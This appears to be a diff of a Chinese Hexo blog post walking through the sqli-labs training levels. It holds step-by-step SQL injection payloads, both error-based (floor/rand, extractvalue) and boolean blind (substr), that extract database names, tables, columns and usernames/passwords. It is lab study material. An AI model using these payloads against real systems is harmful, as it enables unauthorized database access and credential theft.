@@ -7,39 +7,17 @@
   
   <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="第一关第一步：输入?id&#x3D;1页面正常： 第二步:在1后面加  ‘  ， 第三步：报错注入：在后面加上 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)   第四步：获取数据库名：and(select extractvalu">
+  <meta name="description" content="sqli-libs 第一关第一步：输入?id&#x3D;1页面正常 第二步:在1后面加’ 第三步：报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)  第四步：获取数据库名:1’and(select extractval">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/2022/03/24/3.22/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="第一关第一步：输入?id&#x3D;1页面正常： 第二步:在1后面加  ‘  ， 第三步：报错注入：在后面加上 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)   第四步：获取数据库名：and(select extractvalu">
+<meta property="og:description" content="sqli-libs 第一关第一步：输入?id&#x3D;1页面正常 第二步:在1后面加’ 第三步：报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)  第四步：获取数据库名:1’and(select extractval">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(179).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(181).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(182).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(183).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(184).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(185).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(186).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(203).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(204).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(198).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(199).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(200).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(201).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(202).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(205).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(206).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(207).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(208).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(209).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(210).png">
-<meta property="og:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(211).png">
 <meta property="article:published_time" content="2022-03-24T10:00:32.770Z">
-<meta property="article:modified_time" content="2022-03-25T10:46:26.177Z">
+<meta property="article:modified_time" content="2022-04-06T08:31:15.188Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(179).png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -100,44 +78,28 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>输入?id=1页面正常：<img src="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(179).png" alt="屏幕截图(179)"></p>
-<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步:"></a>第二步:</h2><p>在1后面加  ‘  ，<img src="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(181).png"></p>
-<h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>报错注入：在后面加上 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y) </p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(182).png"></p>
-<h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>获取数据库名：and(select extractvalue(1,concat(0x7e,(select database())))) –+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(183).png" alt="屏幕截图(183)"></p>
-<h2 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h2><p>获取表名:and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+<img src="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(184).png" alt="屏幕截图(184)"></p>
-<h2 id="第六步："><a href="#第六步：" class="headerlink" title="第六步："></a>第六步：</h2><p>获取列名:and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+<img src="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(185).png" alt="屏幕截图(185)"></p>
-<h2 id="第七步："><a href="#第七步：" class="headerlink" title="第七步："></a>第七步：</h2><p>获取数据值：and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+<img src="https://raw.githubusercontent.com/lyfaijh/img/main/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(186).png" alt="屏幕截图(186)"></p>
-<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p>第二关与第一关差别不大，只需要在报错后去掉   ’   即可，其余不变</p>
-<h2 id="第一步：-1"><a href="#第一步：-1" class="headerlink" title="第一步："></a>第一步：</h2><p>输入?id=1页面正常：<img src="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(203).png" alt="屏幕截图(203)"></p>
-<h2 id="第二步-1"><a href="#第二步-1" class="headerlink" title="第二步:"></a>第二步:</h2><p>在1后面加  ‘  ，页面报错:</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(204).png" alt="屏幕截图(204)"></p>
+        <p>sqli-libs</p>
+<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>输入?id=1页面正常</p>
+<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步:"></a>第二步:</h2><p>在1后面加’</p>
+<h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y) </p>
+<h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>获取数据库名:1’and(select extractvalue(1,concat(0x7e,(select database())))) –+</p>
+<h2 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h2><p>获取表名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+</p>
+<h2 id="第六步："><a href="#第六步：" class="headerlink" title="第六步："></a>第六步：</h2><p>获取列名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+</p>
+<h2 id="第七步："><a href="#第七步：" class="headerlink" title="第七步："></a>第七步：</h2><p>获取数据值:1’and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+!</p>
+<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p>第二关与第一关差别不大，只需要在报错后去掉 ‘ 即可，其余不变</p>
+<h2 id="第一步：-1"><a href="#第一步：-1" class="headerlink" title="第一步："></a>第一步：</h2><p>输入?id=1页面正常</p>
+<h2 id="第二步-1"><a href="#第二步-1" class="headerlink" title="第二步:"></a>第二步:</h2><p>在1后面加  ‘  ，页面报错</p>
 <h2 id="第三步：-1"><a href="#第三步：-1" class="headerlink" title="第三步："></a>第三步：</h2><p>报错注入：在后面加上 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y) </p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(198).png" alt="屏幕截图(198)"></p>
 <h2 id="第四步：-1"><a href="#第四步：-1" class="headerlink" title="第四步："></a>第四步：</h2><p>获取数据库名：and(select extractvalue(1,concat(0x7e,(select database())))) –+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(199).png" alt="屏幕截图(199)"></p>
 <h2 id="第五步：-1"><a href="#第五步：-1" class="headerlink" title="第五步："></a>第五步：</h2><p>获取表名:and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(200).png" alt="屏幕截图(200)"></p>
 <h2 id="第六步：-1"><a href="#第六步：-1" class="headerlink" title="第六步："></a>第六步：</h2><p>获取列名:and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(201).png" alt="屏幕截图(201)"></p>
 <h2 id="第七步：-1"><a href="#第七步：-1" class="headerlink" title="第七步："></a>第七步：</h2><p>获取数据值：and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(202).png" alt="屏幕截图(202)"></p>
-<h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><p>与第一关差别不大，只需要在1’后加上)即可，其余不变</p>
-<h2 id="第一步：-2"><a href="#第一步：-2" class="headerlink" title="第一步："></a>第一步：</h2><p>输入?id=1页面正常：![屏幕截图(179)](C:\Users\Administrator\Pictures\Screenshots\1\</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(205).png" alt="屏幕截图(205)"></p>
-<h2 id="第二步-2"><a href="#第二步-2" class="headerlink" title="第二步:"></a>第二步:</h2><p>在1后面加  ‘  ，页面报错:</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(206).png" alt="屏幕截图(206)"></p>
-<h2 id="第三步：-2"><a href="#第三步：-2" class="headerlink" title="第三步："></a>第三步：</h2><p>报错注入：在后面加上 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y) </p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(207).png" alt="屏幕截图(207)"></p>
-<h2 id="第四步：-2"><a href="#第四步：-2" class="headerlink" title="第四步："></a>第四步：</h2><p>获取数据库名：and(select extractvalue(1,concat(0x7e,(select database())))) –+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(208).png" alt="屏幕截图(208)"></p>
-<h2 id="第五步：-2"><a href="#第五步：-2" class="headerlink" title="第五步："></a>第五步：</h2><p>获取表名:and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(209).png" alt="屏幕截图(209)"></p>
-<h2 id="第六步：-2"><a href="#第六步：-2" class="headerlink" title="第六步："></a>第六步：</h2><p>获取列名:and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(210).png" alt="屏幕截图(210)"></p>
-<h2 id="第七步：-2"><a href="#第七步：-2" class="headerlink" title="第七步："></a>第七步：</h2><p>获取数据值：and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+</p>
-<p><img src="https://raw.githubusercontent.com/lyfaijh/img/main/3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(211).png" alt="屏幕截图(211)"></p>
+<p>第三关:<br>与第一关差别不大，只需要在1’后加上)即可，其余不变</p>
+<p>第四关：<br>同前三关一样 只需要把第三关的单引号变成双引号</p>
+<p>第五关：<br>采用报错注入，需要双注入，?id=-1’,其余同前四关一致</p>
+<p>第六关：<br>将第五关的单引号变成双引号即可</p>
+<p>第七关：<br>不知道</p>
+<p>第八关：<br>采用布尔盲注<br>获取数据库名<br>‘ and substr(database(),1,1)= “a” –+  security<br>获取表名<br>‘ and substr((select table_name from information_schema。tables where table_schema=’security’ limit x,1),1,1)=’a’–+  x为第几个表，第一个表是referer,第三个表是users<br>获取列名<br>‘ and substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),1,8)=’a’–+   x同上,第一列是username,第二列是password<br>获取数据<br>‘ and substr((select username from users limit 0,1),1,1)=’a’–+   dumb<br>‘ and substr((select password from users limit 0,1),1,1)=’a’–+   dumb</p>
 
       
     </div>
